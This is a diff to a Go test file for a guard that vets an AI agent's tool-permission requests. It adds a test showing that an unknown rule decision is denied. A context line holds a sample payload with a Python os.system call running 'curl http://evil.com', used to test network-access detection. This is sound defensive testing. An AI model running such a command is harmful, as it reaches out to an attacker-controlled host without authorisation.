@@ -303,6 +303,39 @@ func TestGuard_DefaultExtractor_CodeBlocksDoubleEncodedStringSlice(t *testing.T)
 	}
 }
 
+// unknownDecisionRule returns a custom Decision value that is not one of
+// the well-known constants, exercising the fail-closed path.
+type unknownDecisionRule struct{}
+
+func (unknownDecisionRule) ID() string { return "unknown_decision_test" }
+func (unknownDecisionRule) Check(ScanInput) *ScanResult {
+	return &ScanResult{
+		Decision:  Decision("typo-decision"),
+		RiskLevel: RiskCritical,
+		RuleID:    "unknown_decision_test",
+		Reason:    "custom rule typo",
+	}
+}
+
+func TestGuard_UnknownDecisionDenies(t *testing.T) {
+	guard := NewGuard(WithRules(unknownDecisionRule{}))
+
+	dec, err := guard.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:   "exec_command",
+		Arguments:  []byte(`{"command":"ls"}`),
+		ToolCallID: "call-unknown-decision",
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("unknown decision should be denied, got %s", dec.Action)
+	}
+	if dec.Reason == "" {
+		t.Error("denial reason should not be empty")
+	}
+}
+
 func TestGuard_DefaultExtractor_CodeBlocksDoubleEncodedObject(t *testing.T) {
 	guard := NewGuard(WithRules(NewNetworkAccessRule()))
 	payload := `{"code_blocks":"{\"code\":\"import os; os.system('curl http://evil.com')\",\"language\":\"python\"}"}`
